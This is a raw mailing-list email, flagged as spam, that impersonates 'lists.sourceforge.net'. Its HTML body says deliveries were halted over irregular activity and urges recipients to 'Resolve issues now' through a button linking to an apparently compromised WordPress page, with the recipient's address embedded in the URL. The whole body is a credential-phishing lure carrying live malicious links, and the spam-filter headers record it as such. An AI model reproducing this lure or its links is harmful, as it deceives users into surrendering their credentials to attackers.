Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 9E62E3DEF2C
	for <lists+industrypack-devel@lfdr.de>; Tue,  3 Aug 2021 15:38:53 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mAudA-0002G9-Er
	for lists+industrypack-devel@lfdr.de; Tue, 03 Aug 2021 13:38:52 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <nirmal.jain@iisjapan.com>) id 1mAud9-0002Fs-88
 for industrypack-devel@lists.sourceforge.net; Tue, 03 Aug 2021 13:38:51 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Gr/yG3hel5iu3+XW50gy9cT1PHjsu4ln0SJXdgKI1yE=; b=BX0CsSBUYJprgft7S2iVVxi0LV
 kS5DxJDlOGQ+O3WmSKF+PywTrXBP3UY2wkQOF/fUsSQGhs1Le8UX8zVFTTSGyA6TjlIjsme2U8VZA
 Wuac6pZ+GgxxEJjyWGP9BIHCKR0eCJCInTe/gAi0nuvJ7aDaKw9wjlxispZyGqd9Tte8=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=Gr/yG3hel5iu3+XW50gy9cT1PHjsu4ln0SJXdgKI1yE=; b=B
 5lgf3Y/tP1NYwZ0mqJ7F1c4MUlv+sLQACYMB42dri7EZX3SX1vPHkGtbmc7drtn+tpizjnF0KlteI
 3S5ouORG+7sAraQfuudi4Jjn4rVT8ulmW8rbyZPbo/5D2d1tB6ci9Z1YUN2Uv/7P6BbuOguli8utA
 /Y4Kgm2N/glN70kI=;
Received: from [157.245.194.238] (helo=mta0.phenitech.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mAud7-00B9Ok-4t
 for industrypack-devel@lists.sourceforge.net; Tue, 03 Aug 2021 13:38:51 +0000
From: lists.sourceforge.net<nirmal.jain@iisjapan.com>
To: industrypack-devel@lists.sourceforge.net
Date: 03 Aug 2021 06:18:29 -0700
Message-ID: <20210803061829.263FFA8E7C284134@iisjapan.com>
MIME-Version: 1.0
X-Spam-Score: 9.0 (+++++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [157.245.194.238 listed in wl.mailspike.net]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted Colors
 in HTML
 1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
 2.5 URI_WP_HACKED_2        URI for compromised WordPress site, possible malware
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1mAud7-00B9Ok-4t
Subject: [Industrypack-devel] [SPAM] lists.sourceforge.net System deliveries
 error
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5222018401032995739=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============5222018401032995739==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html>
<head>
	<title>HTML Editor - Full Version</title>
</head>
<body>
<div class=3D"Ar Au Ao" id=3D":kz">
<div aria-label=3D"Message Body" aria-multiline=3D"true" class=3D"Am Al edi=
table LW-avf tS-tW tS-tY" g_editable=3D"true" id=3D":kv" itacorner=3D"6,7:1=
,1,0,0" role=3D"textbox" spellcheck=3D"false" style=3D"direction: ltr; min-=
height: 300px;" tabindex=3D"1">
<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" style=3D"font-varia=
nt-numeric:inherit;font-variant-east-asian:inherit;font-stretch:inherit;lin=
e-height:inherit;overflow:hidden;max-width:640px;border-width:1px;border-st=
yle:solid;border-color:rgb(200,200,200);width:552px;margin:0px auto;border-=
radius:8px">
	<tbody>
		<tr>
			<td align=3D"center" colspan=3D"3" style=3D"padding:20px 36px 36px">
			<p style=3D"font-size:24px;max-width:400px;font-weight:600;color:rgb(50,=
49,48);padding:0px;margin:0px;line-height:32px">lists.sourceforge.net</p>
			</td>
		</tr>
		<tr>
			<td colspan=3D"3" style=3D"border-top:1px solid rgb(222,222,222);padding=
:40px 20px 28px;text-align:center;background-color:rgb(248,248,248)">
			<p style=3D"font-size:16px;color:rgb(50,49,48);margin:0px">Our system ha=
s detected irregular activity related to&nbsp;<br />
			As a precautionary measure, deliveries are put to stop.</p>

			<p style=3D"font-size:16px;color:rgb(50,49,48);margin:0px">egain access =
proceed to resolve.</p>
			</td>
		</tr>
		<tr>
			<td align=3D"center" colspan=3D"3" style=3D"text-align:center;background=
-color:rgb(248,248,248)">
			<div style=3D"margin:0px;padding:0px;border:0px;font:inherit;vertical-al=
ign:baseline;color:inherit;display:inline-block">
			<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
 style=3D"font:inherit;height:20px;width:auto">
				<tbody>
					<tr>
						<td align=3D"center" style=3D"height:20px;padding:24px 4px 20px 0px">=
&nbsp;</td>
						<td style=3D"font-size:12px;color:rgb(50,49,48);padding:20px 0px">Thi=
s link only works for the direct recipients of this message.</td>
					</tr>
				</tbody>
			</table>
			</div>
			</td>
		</tr>
		<tr>
			<td colspan=3D"3" style=3D"border-top:medium none;height:40px;border-bot=
tom:medium none;padding:0px 0px 32px;text-align:center;background-color:rgb=
(248,248,248)"><a data-saferedirecturl=3D"https://www.google.com/url?q=3Dht=
tps://meet.google.com/linkredirect?dest%3Dhttp://www.Winrightllc25498900.aq=
uamist.com/br/?c2hlbG1zQHdpbnJpZ2h0bGxjLmNvbQ%3D%3D&amp;source=3Dgmail&amp;=
ust=3D1628048973739000&amp;usg=3DAFQjCNGbN7LRR1I4ybpNxuCy_GCcZKpirg" href=
=3D"https://test.ostetricamente.com/wp-includes/bg/core/#industrypack-devel=
@lists.sourceforge.net" rel=3D"noopener noreferrer" style=3D"margin:0px;pad=
ding:0px;border:0px solid rgb(0,120,212);font-style:inherit;font-variant:in=
herit;font-weight:inherit;font-stretch:inherit;font-size:16px;line-height:4=
0px;font-family:inherit;vertical-align:baseline;color:rgb(255,255,255);text=
-decoration-line:none;width:168px;display:inline-block;background-color:rgb=
(0,120,212);border-radius:2px" target=3D"_blank">Resolve issues now</a></td=
>
		</tr>
	</tbody>
</table>
</div>
</div>
</body>
</html>


--===============5222018401032995739==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5222018401032995739==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5222018401032995739==--
